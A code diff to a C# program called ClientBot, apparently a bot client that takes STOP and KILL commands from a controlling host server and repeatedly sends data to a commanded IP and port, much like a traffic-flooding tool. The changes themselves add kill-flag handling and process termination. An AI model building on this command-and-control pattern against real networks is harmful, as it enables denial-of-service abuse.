@@ -11,7 +11,7 @@ using Microsoft.Win32;
 using Client;
 using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
-
+using System.Diagnostics;
 
 namespace ClientBot
 {
@@ -138,7 +138,7 @@ namespace ClientBot
                     byte[] data = new byte[1024];
                     int receivedData = stream.Read(data, 0, data.Length);
                     ret = Encoding.ASCII.GetString(data, 0, receivedData);
-                    Logger.Log(ret);
+                    //Logger.Log(ret);
 
                     if (ret.Equals(Command.STOP.ToString()))
                     {
@@ -199,7 +199,8 @@ namespace ClientBot
                     else if (ret.Equals(Command.KILL.ToString()))
                     {
                         Console.WriteLine(getTime() + "Exiting");
-                        Thread.Sleep(10000);
+                        kill = true;
+                        //Thread.Sleep(10000);
                         KillApp();
                     }
                     else
@@ -246,7 +247,15 @@ namespace ClientBot
             }
             catch(Exception e)
             {
-                Restart();
+                if (e is ThreadAbortException)
+                {
+                    KillApp();
+                }
+                else
+                {
+                    Console.WriteLine(e);
+                    Restart();
+                }
             }
         }
         static void task()
@@ -281,7 +290,7 @@ namespace ClientBot
                     int i = 0;
                     while (ClientBot.SEND.sendData(ip, port, dataAmount, "hello there"))
                     {
-                        if (hostServer.Connected)
+                        if (hostServer.Connected&&!kill)
                         {
                             if (clientState == State.CLIENT_SEND)
                             {
@@ -303,7 +312,7 @@ namespace ClientBot
                         else
                         {
                             break;
-                            throw new Exception("Host Disconnected");
+                            throw new Exception("Host Disconnected/Kill Command Recieved");
                         }
                     }
                 }
@@ -570,11 +579,25 @@ namespace ClientBot
         //Kills all running threads and shuts down client
         static void KillApp()
         {
-            foreach(Thread s in threadList)
+            try
             {
-                s.Abort();
+                Console.WriteLine("KILLING APP");
+                foreach (Thread s in threadList)
+                {
+                    s.Abort();
+                    Console.WriteLine("Exited Thread");
+                }
+                //Environment.Exit(0);
+                Console.WriteLine("BYE BYE");
+                Process.GetCurrentProcess().Kill();
             }
-            Environment.Exit(0);
+            catch(Exception e)
+            {
+                Console.WriteLine(e);
+                //Environment.Exit(0);
+                Console.WriteLine("BYE BYE BYE");
+                Process.GetCurrentProcess().Kill();
+            }
         }
         //closes all running threads except one thread for restart
         static void Restart()
